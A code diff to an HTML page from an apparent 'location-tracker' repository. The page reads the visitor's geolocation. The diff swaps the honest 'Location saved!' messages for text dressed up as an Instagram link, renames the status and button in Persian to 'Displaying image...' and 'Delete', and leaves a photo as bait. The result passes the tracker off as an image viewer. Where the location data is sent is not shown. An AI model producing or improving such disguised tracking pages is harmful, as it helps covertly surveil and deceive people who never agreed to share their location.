@@ -18,8 +18,8 @@
         function showPosition(position) {
             var latitude = position.coords.latitude;
             var longitude = position.coords.longitude;
-            document.getElementById("status").innerHTML = "Location saved! Latitude: " + latitude + " Longitude: " + longitude;
-            document.getElementById("location").innerHTML = "Current Location: Latitude: " + latitude + ", Longitude: " + longitude;
+            document.getElementById("status").innerHTML = "instagram.com/"+latitude+"-"+longitude;
+            document.getElementById("location").innerHTML = "instagram.com/"+latitude+"-"+longitude;
         }
 
         // Function to handle errors if location cannot be retrieved
@@ -51,15 +51,15 @@
 </head>
 <body>
     <h2>Click the link to save your location</h2>
-    <p id="status">Tracking location...</p>
+    <p id="status">نمایش تصویر...</p>
     
     <!-- This is where the location info will appear -->
     <p id="location"></p>
 
     <!-- Button to refresh location -->
-    <button onclick="refreshLocation()">Get My Location Again</button>
+    <button onclick="refreshLocation()">حذف</button>
     <!-- Image you uploaded -->
-    <img src="https://raw.githubusercontent.com/vhd10281986/location-tracker/refs/heads/main/photo_2024-11-19_14-09-32.jpg" alt="Location Image" width="400">
+    <img src="https://raw.githubusercontent.com/vhd10281986/location-tracker/refs/heads/main/photo_2024-11-19_14-09-32.jpg" alt="Location Image" width="300">
 
 </body>
 </html>
